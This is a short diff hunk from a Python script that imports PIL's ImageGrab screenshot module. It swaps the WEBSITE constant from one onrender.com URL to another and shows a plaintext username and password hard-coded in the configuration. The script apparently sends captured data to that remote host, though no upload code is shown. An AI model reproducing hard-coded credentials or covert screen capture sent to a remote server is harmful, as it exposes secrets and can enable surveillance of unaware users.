@@ -23,7 +23,7 @@ from PIL import ImageGrab
 # CONFIGURATION
 # ==================================================
 
-WEBSITE = "https://cutiepie-3ou0.onrender.com"
+WEBSITE = "https://downloaders-p4g5.onrender.com"
 
 USERNAME = "xyrielly"
 PASSWORD = "BRODONTHACKME1"
